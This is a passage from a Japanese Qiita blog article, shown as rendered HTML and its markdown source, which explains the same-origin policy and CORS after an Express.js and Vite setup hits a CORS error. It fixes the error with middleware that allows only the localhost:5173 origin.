height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"29:1-29:29\">\n<span id=\"同一オリジンとは\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E4%B8%80%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>同一オリジンとは</h4>\n<p data-sourcepos=\"30:1-30:126\">リクエスト元、リクエスト先のドメイン（スキーム、ホスト、ポート番号）が同じであること</p>\n<p data-sourcepos=\"32:1-33:57\"><strong>同一オリジンの例</strong><br>\n<a href=\"http://localhost:5173/api\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:5173/api</a> → <a href=\"http://localhost:5173/users\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:5173/users</a></p>\n<p data-sourcepos=\"35:1-35:137\">また、自身とは異なるドメインに対してリクエスト送信することを<code>クロスオリジン通信</code>と呼びます。</p>\n<p data-sourcepos=\"37:1-37:31\"><strong>クロスオリジンの例</strong></p>\n<ul data-sourcepos=\"38:1-41:0\">\n<li data-sourcepos=\"38:1-38:98\">\n<a href=\"http://localhost:5173\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:5173</a> → <a href=\"http://localhost:3000\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:3000</a> （今回のエラー、ポートが異なる）</li>\n<li data-sourcepos=\"39:1-39:78\">\n<a href=\"http://localhost:5173\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:5173</a> → <a href=\"https://localhost:5173\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://localhost:5173</a> （スキームが違う）</li>\n<li data-sourcepos=\"40:1-41:0\">\n<a href=\"http://example.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://example.com</a> → <a href=\"http://api.example.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://api.example.com</a> （ホストが違う）</li>\n</ul>\n<p data-sourcepos=\"42:1-43:63\">クロスオリジン通信の場合、ブラウザがこのリクエストは危険と判断しエラーを返します。<br>\nそのため、表題のエラーが発生していました。</p>\n<h1 data-sourcepos=\"45:1-45:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"46:1-46:113\">CORSの仕組みを使い、<a href=\"http://localhost:3000\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:3000</a> で定義したサーバー側に応答ヘッダを定義する</p>\n<h2 data-sourcepos=\"48:1-48:13\">\n<span id=\"corsとは\" class=\"fragment\"></span><a href=\"#cors%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>CORSとは</h2>\n<p data-sourcepos=\"49:1-50:93\"><strong>CORS（Cross-Origin Rescource Sharing）</strong><br>\n同一オリジンポリシーによる制限を解除するために考えられた仕組み</p>\n<p data-sourcepos=\"52:1-52:19\"><strong>MDNより引用</strong></p>\n<blockquote data-sourcepos=\"53:1-54:284\">\n<p data-sourcepos=\"53:2-53:602\">オリジン間リソース共有 (Cross-Origin Resource Sharing, CORS) は、 HTTP ヘッダーベースの仕組みを使用して、あるオリジンで動作しているウェブアプリケーションに、異なるオリジンにある選択されたリソースへのアクセス権を与えるようブラウザーに指示するための仕組みです。ウェブアプリケーションは、自分とは異なるオリジン (ドメイン、プロトコル、ポート番号) にあるリソースをリクエストするとき、オリジン間 HTTP リクエストを実行します。</p>\n<blockquote data-sourcepos=\"54:2-54:284\">\n<p data-sourcepos=\"54:3-54:284\">オリジン間リクエストとは、例えば <a href=\"https://domain-a.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://domain-a.com</a> で提供されているウェブアプリケーションのフロントエンド JavaScript コードが fetch() を使用して <a href=\"https://domain-b.com/data.json\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://domain-b.com/data.json</a> へリクエストを行うようなものです。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"56:1-56:58\"><iframe id=\"qiita-embed-content__2a5f50d0dd47f6305af1341c2f6bb005\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2a5f50d0dd47f6305af1341c2f6bb005\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCORS\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"59:1-59:25\">\n<span id=\"corsの動作フロー\" class=\"fragment\"></span><a href=\"#cors%E3%81%AE%E5%8B%95%E4%BD%9C%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>CORSの動作フロー</h2>\n<p data-sourcepos=\"60:1-60:96\">以下の流れでクロスオリジンリクエストの許可のやりとりを行います。</p>\n<ol data-sourcepos=\"62:1-65:0\">\n<li data-sourcepos=\"62:1-62:94\">ブラウザ：「このAPIにアクセスしていいか？」（OPTIONSリクエスト）</li>\n<li data-sourcepos=\"63:1-63:89\">サーバー：「このオリジンからならOK」（Access-Control-Allow-Origin）</li>\n<li data-sourcepos=\"64:1-65:0\">ブラウザ：「本番のリクエスト送ります」（実際のGET/POST等）</li>\n</ol>\n<h3 data-sourcepos=\"66:1-66:67\">\n<span id=\"1optionsリクエストプリフライトリクエスト\" class=\"fragment\"></span><a href=\"#1options%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%97%E3%83%AA%E3%83%95%E3%83%A9%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>1.OPTIONSリクエスト（プリフライトリクエスト）</h3>\n<p data-sourcepos=\"67:1-67:119\">HTTPヘッダをつかってOPTIONSメソッドによるリクエストを行います（条件によって省略可）</p>\n<p data-sourcepos=\"0:0-0:0\"><strong>HTTPヘッダには以下を定義する</strong></p>\n<table data-sourcepos=\"69:1-74:82\">\n<thead>\n<tr data-sourcepos=\"69:1-69:67\">\n<th style=\"text-align: center\" data-sourcepos=\"69:47-69:57\">ヘッダ</th>\n<th style=\"text-align: center\" data-sourcepos=\"69:59-69:66\">中身</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"72:1-72:54\">\n<td style=\"text-align: center\" data-sourcepos=\"72:2-72:10\">Origin</td>\n<td style=\"text-align: center\" data-sourcepos=\"72:12-72:53\">リクエスト要求者のオリジン</td>\n</tr>\n<tr data-sourcepos=\"73:1-73:84\">\n<td style=\"text-align: center\" data-sourcepos=\"73:2-73:33\">Access-Control-Request-Method</td>\n<td style=\"text-align: center\" data-sourcepos=\"73:35-73:83\">送信を許可してほしいHTTPメソッド</td>\n</tr>\n<tr data-sourcepos=\"74:1-74:82\">\n<td style=\"text-align: center\" data-sourcepos=\"74:2-74:34\">Access-Control-Request-Headers</td>\n<td style=\"text-align: center\" data-sourcepos=\"74:36-74:81\">送信を許可してほしいHTTPヘッダ</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"76:1-76:66\">\n<span id=\"2リクエストの判断を行いレスポンスの返却\" class=\"fragment\"></span><a href=\"#2%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%AE%E5%88%A4%E6%96%AD%E3%82%92%E8%A1%8C%E3%81%84%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%81%AE%E8%BF%94%E5%8D%B4\"><i class=\"fa fa-link\"></i></a>2.リクエストの判断を行い、レスポンスの返却</h3>\n<p data-sourcepos=\"78:1-78:102\">サーバーはリクエストを受けると以下の情報をレスポンスとして返却します</p>\n<table data-sourcepos=\"80:1-87:99\">\n<thead>\n<tr data-sourcepos=\"80:1-80:22\">\n<th style=\"text-align: center\" data-sourcepos=\"80:2-80:12\">ヘッダ</th>\n<th style=\"text-align: center\" data-sourcepos=\"80:14-80:21\">中身</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"82:1-82:69\">\n<td style=\"text-align: center\" data-sourcepos=\"82:2-82:31\">Access-Control-Allow-Origin</td>\n<td style=\"text-align: center\" data-sourcepos=\"82:33-82:68\">送信を許可するオリジン</td>\n</tr>\n<tr data-sourcepos=\"83:1-83:73\">\n<td style=\"text-align: center\" data-sourcepos=\"83:2-83:31\">Access-Control-Allow-Methods</td>\n<td style=\"text-align: center\" data-sourcepos=\"83:33-83:72\">送信を許可するHTTPメソッド</td>\n</tr>\n<tr data-sourcepos=\"84:1-84:70\">\n<td style=\"text-align: center\" data-sourcepos=\"84:2-84:32\">Access-Control-Allow-Headers</td>\n<td style=\"text-align: center\" data-sourcepos=\"84:34-84:69\">送信を許可するHTTPヘッダ</td>\n</tr>\n<tr data-sourcepos=\"85:1-85:79\">\n<td style=\"text-align: center\" data-sourcepos=\"85:2-85:35\">Access-Control-Allow-Credentials</td>\n<td style=\"text-align: center\" data-sourcepos=\"85:37-85:78\">クッキーなど送信して良いか</td>\n</tr>\n<tr data-sourcepos=\"86:1-86:77\">\n<td style=\"text-align: center\" data-sourcepos=\"86:2-86:32\">Access-Control-Expose-Headers</td>\n<td style=\"text-align: center\" data-sourcepos=\"86:34-86:76\">JavaScriptからの参照を許可する</td>\n</tr>\n<tr data-sourcepos=\"87:1-87:99\">\n<td style=\"text-align: center\" data-sourcepos=\"87:2-87:25\">Access-Control-Max-Age</td>\n<td style=\"text-align: center\" data-sourcepos=\"87:27-87:98\">プリフライトリクエストの結果を保存していい期間</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"89:1-89:27\">\n<span id=\"3apiのリクエスト\" class=\"fragment\"></span><a href=\"#3api%E3%81%AE%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>3.APIのリクエスト</h3>\n<p data-sourcepos=\"90:1-90:105\">レスポンスで送信許可を確認したブラウザは、APIのリクエストを送信します。</p>\n<h2 data-sourcepos=\"92:1-92:37\">\n<span id=\"実処理でcorsを取り入れる\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E5%87%A6%E7%90%86%E3%81%A7cors%E3%82%92%E5%8F%96%E3%82%8A%E5%85%A5%E3%82%8C%E3%82%8B\"><i class=\"fa fa-link\"></i></a>実処理でCORSを取り入れる</h2>\n<p data-sourcepos=\"94:1-94:147\">上記フロー「 2.リクエストの判断を行い、レスポンスの返却」の実装を追加することにより解決できました。</p>\n<div class=\"code-frame\" data-lang=\"diff_typescript\" data-sourcepos=\"96:1-133:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">express</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">express</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">generatePortfolioFile</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./scripts/savePortfolio.ts</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">app</span> <span class=\"o\">=</span> <span class=\"nf\">express</span><span class=\"p\">();</span>\n<span class=\"kd\">const</span> <span class=\"nx\">port</span> <span class=\"o\">=</span> <span class=\"mi\">3000</span><span class=\"p\">;</span>\n\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">use</span><span class=\"p\">((</span><span class=\"nx\">req</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">,</span> <span class=\"nx\">next</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">header</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Access-Control-Allow-Origin</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">http://localhost:5173</span><span class=\"dl\">\"</span><span class=\"p\">);</span> <span class=\"c1\">// http://localhost:5173のオリジンを許可</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">header</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Access-Control-Allow-Methods</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">GET, POST, PUT, DELETE, OPTIONS</span><span class=\"dl\">\"</span><span class=\"p\">);</span> <span class=\"c1\">// 送信を許可するHTTPメソッド</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">header</span><span class=\"p\">(</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>    <span class=\"dl\">\"</span><span class=\"s2\">Access-Control-Allow-Headers</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>    <span class=\"dl\">\"</span><span class=\"s2\">Origin, X-Requested-With, Content-Type, Accept, Authorization</span><span class=\"dl\">\"</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"p\">);</span> <span class=\"c1\">// 送信を許可するHTTPヘッダ</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">method</span> <span class=\"o\">===</span> <span class=\"dl\">\"</span><span class=\"s2\">OPTIONS</span><span class=\"dl\">\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">sendStatus</span><span class=\"p\">(</span><span class=\"mi\">200</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>    <span class=\"nf\">next</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"p\">}</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"p\">});</span>\n</span>\n<span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">/api/generate-portfolio</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">qiitaId</span><span class=\"p\">,</span> <span class=\"nx\">githubId</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">;</span>\n\n  <span class=\"k\">try</span> <span class=\"p\">{</span>\n    <span class=\"k\">await</span> <span class=\"nf\">generatePortfolioFile</span><span class=\"p\">(</span><span class=\"nx\">qiitaId</span><span class=\"p\">,</span> <span class=\"nx\">githubId</span><span class=\"p\">);</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"mi\">200</span><span class=\"p\">).</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Portfolio generated successfully</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span> <span class=\"k\">catch </span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"mi\">500</span><span class=\"p\">).</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Failed to generate portfolio</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">listen</span><span class=\"p\">(</span><span class=\"nx\">port</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`Example app listening on port </span><span class=\"p\">${</span><span class=\"nx\">port</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n</code></pre></div></div>\n<p data-sourcepos=\"135:1-135:69\"><code>cors</code>パッケージを使うとより簡単に定義できます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"137:1-166:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">express</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">express</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">generatePortfolioFile</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./scripts/savePortfolio.ts</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">cors</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">cors</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">app</span> <span class=\"o\">=</span> <span class=\"nf\">express</span><span class=\"p\">();</span>\n<span class=\"kd\">const</span> <span class=\"nx\">port</span> <span class=\"o\">=</span> <span class=\"mi\">3000</span><span class=\"p\">;</span>\n\n<span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">use</span><span class=\"p\">(</span>\n  <span class=\"nf\">cors</span><span class=\"p\">({</span>\n    <span class=\"na\">origin</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">http://localhost:5173</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"c1\">// http://localhost:5173のオリジンを許可</span>\n  <span class=\"p\">})</span>\n<span class=\"p\">);</span>\n\n<span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">/api/generate-portfolio</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">qiitaId</span><span class=\"p\">,</span> <span class=\"nx\">githubId</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">;</span>\n\n  <span class=\"k\">try</span> <span class=\"p\">{</span>\n    <span class=\"k\">await</span> <span class=\"nf\">generatePortfolioFile</span><span class=\"p\">(</span><span class=\"nx\">qiitaId</span><span class=\"p\">,</span> <span class=\"nx\">githubId</span><span class=\"p\">);</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"mi\">200</span><span class=\"p\">).</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Portfolio generated successfully</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span> <span class=\"k\">catch </span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"mi\">500</span><span class=\"p\">).</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Failed to generate portfolio</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nf\">listen</span><span class=\"p\">(</span><span class=\"nx\">port</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`Example app listening on port </span><span class=\"p\">${</span><span class=\"nx\">port</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n</code></pre></div></div>\n<h1 data-sourcepos=\"168:1-168:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"169:1-170:144\">エラーを通してCORSの仕組みを学ぶことができました。<br>\n技術書を読んだだけでは理解しづらい概念もエラーを通して学ぶと理解度が上がると感じた出来事でした。</p>\n<h1 data-sourcepos=\"172:1-172:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"174:1-174:241\"><iframe id=\"qiita-embed-content__424ae75b6570384c51639fa36fea3c8a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__424ae75b6570384c51639fa36fea3c8a\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FSecurity%2FSame-origin_policy%23%25E7%2595%25B0%25E3%2581%25AA%25E3%2582%258B%25E3%2582%25AA%25E3%2583%25AA%25E3%2582%25B8%25E3%2583%25B3%25E3%2581%25B8%25E3%2581%25AE%25E3%2583%258D%25E3%2583%2583%25E3%2583%2588%25E3%2583%25AF%25E3%2583%25BC%25E3%2582%25AF%25E3%2582%25A2%25E3%2582%25AF%25E3%2582%25BB%25E3%2582%25B9\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"176:1-176:44\"><iframe id=\"qiita-embed-content__4f095a32a35abb6224bce193dc33f675\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4f095a32a35abb6224bce193dc33f675\" data-content=\"https%3A%2F%2Fgihyo.jp%2Fbook%2F2024%2F978-4-297-14571-2\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"178:1-178:58\"><iframe id=\"qiita-embed-content__2809023092499e3d958f70b5ce965f79\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2809023092499e3d958f70b5ce965f79\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCORS\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"180:1-180:60\"><iframe id=\"qiita-embed-content__e6defbd7c3f96c610ce884bd6078c727\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e6defbd7c3f96c610ce884bd6078c727\" data-content=\"https%3A%2F%2Fqiita.com%2Fkaisei_siratama%2Fitems%2Fb7f88a661eb21b2bd0b5\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"182:1-182:69\"><iframe id=\"qiita-embed-content__4d9f11a6a3134e34768626bea041fec7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4d9f11a6a3134e34768626bea041fec7\" data-content=\"https%3A%2F%2Fcreative.liberta-inc.com%2Fblog%2Fhhow-to-enable-cors-in-express%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nExpress.jsを使って簡易APIを作成、アクセスしようとすると、表題のエラーが発生しました。\n解決方法とCORSについて学んだことをまとめます。\n\n# 問題\n異なるポートでサーバーを起動、ブラウザ上で実行すると下記のエラーが発生\n\n**エラー内容**\n```\nAccess to fetch at 'http://localhost:3000/api/' from origin 'http://localhost:5173' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n```\n\nポートを変えて以下のサーバーを起動していました。\n\n* Viteプロジェクト：http://localhost:5173\n* Express.js：http://localhost:3000\n\n# 原因\nブラウザが`同一オリジンポリシー`を適用していたため。\n\n## 同一オリジンポリシーとは？\nブラウザに搭載されたセキュリティ上の制約\n\n**MDNより引用**\n>同一オリジンポリシーは重要なセキュリティの仕組みであり、あるオリジンによって読み込まれた文書やスクリプトが、他のオリジンにあるリソースにアクセスできる方法を制限するものです。\n\nhttps://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy\n\n#### 同一オリジンとは\nリクエスト元、リクエスト先のドメイン（スキーム、ホスト、ポート番号）が同じであること\n\n**同一オリジンの例**\nhttp://localhost:5173/api → http://localhost:5173/users\n\nまた、自身とは異なるドメインに対してリクエスト送信することを`クロスオリジン通信`と呼びます。\n\n**クロスオリジンの例**\n- http://localhost:5173 → http://localhost:3000 （今回のエラー、ポートが異なる）\n- http://localhost:5173 → https://localhost:5173 （スキームが違う）\n- http://example.com → http://api.example.com （ホストが違う）\n\nクロスオリジン通信の場合、ブラウザがこのリクエストは危険と判断しエラーを返します。\nそのため、表題のエラーが発生していました。\n\n# 解決方法\nCORSの仕組みを使い、http://localhost:3000 で定義したサーバー側に応答ヘッダを定義する\n\n## CORSとは\n**CORS（Cross-Origin Rescource Sharing）**\n同一オリジンポリシーによる制限を解除するために考えられた仕組み\n\n**MDNより引用**\n>オリジン間リソース共有 (Cross-Origin Resource Sharing, CORS) は、 HTTP ヘッダーベースの仕組みを使用して、あるオリジンで動作しているウェブアプリケーションに、異なるオリジンにある選択されたリソースへのアクセス権を与えるようブラウザーに指示するための仕組みです。ウェブアプリケーションは、自分とは異なるオリジン (ドメイン、プロトコル、ポート番号) にあるリソースをリクエストするとき、オリジン間 HTTP リクエストを実行します。\n>>オリジン間リクエストとは、例えば https://domain-a.com で提供されているウェブアプリケーションのフロントエンド JavaScript コードが fetch() を使用して https://domain-b.com/data.json へリクエストを行うようなものです。\n\nhttps://developer.mozilla.org/ja/docs/Web/HTTP/Guides/CORS\n\n\n## CORSの動作フロー\n以下の流れでクロスオリジンリクエストの許可のやりとりを行います。\n\n1. ブラウザ：「このAPIにアクセスしていいか？」（OPTIONSリクエスト）\n1. サーバー：「このオリジンからならOK」（Access-Control-Allow-Origin）\n1. ブラウザ：「本番のリクエスト送ります」（実際のGET/POST等）\n\n### 1.OPTIONSリクエスト（プリフライトリクエスト）\nHTTPヘッダをつかってOPTIONSメソッドによるリクエストを行います（条件によって省略可）\n\n**HTTPヘッダには以下を定義する**\n| ヘッダ | 中身 |\n|:-:|:-:|\n| Origin  | リクエスト要求者のオリジン  |\n| Access-Control-Request-Method  | 送信を許可してほしいHTTPメソッド  |\n| Access-Control-Request-Headers  | 送信を許可してほしいHTTPヘッダ  |\n\n### 2.リクエストの判断を行い、レスポンスの返却\n\nサーバーはリクエストを受けると以下の情報をレスポンスとして返却します\n\n| ヘッダ | 中身 |\n|:-:|:-:|\n| Access-Control-Allow-Origin  | 送信を許可するオリジン  |\n| Access-Control-Allow-Methods | 送信を許可するHTTPメソッド  |\n| Access-Control-Allow-Headers  | 送信を許可するHTTPヘッダ |\n| Access-Control-Allow-Credentials | クッキーなど送信して良いか  |\n| Access-Control-Expose-Headers | JavaScriptからの参照を許可する  |\n| Access-Control-Max-Age | プリフライトリクエストの結果を保存していい期間  |\n\n### 3.APIのリクエスト\nレスポンスで送信許可を確認したブラウザは、APIのリクエストを送信します。\n\n## 実処理でCORSを取り入れる\n\n上記フロー「 2.リクエストの判断を行い、レスポンスの返却」の実装を追加することにより解決できました。\n\n```diff_typescript\nimport express from \"express\";\nimport { generatePortfolioFile } from \"./scripts/savePortfolio.ts\";\n\nconst app = express();\nconst port = 3000;\n\n+ app.use((req, res, next) => {\n+   res.header(\"Access-Control-Allow-Origin\", \"http://localhost:5173\"); // http://localhost:5173のオリジンを許可\n+   res.header(\"Access-Control-Allow-Methods\", \"GET, POST, PUT, DELETE, OPTIONS\"); // 送信を許可するHTTPメソッド\n+   res.header(\n+     \"Access-Control-Allow-Headers\",\n+     \"Origin, X-Requested-With, Content-Type, Accept, Authorization\"\n+   ); // 送信を許可するHTTPヘッダ\n+ \n+   if (req.method === \"OPTIONS\") {\n+     res.sendStatus(200);\n+   } else {\n+     next();\n+   }\n+ });\n\napp.post(\"/api/generate-portfolio\", async (req, res) => {\n  const { qiitaId, githubId } = req.body;\n\n  try {\n    await generatePortfolioFile(qiitaId, githubId);\n    res.status(200).send(\"Portfolio generated successfully\");\n  } catch (error) {\n    res.status(500).send(\"Failed to generate portfolio\");\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Example app listening on port 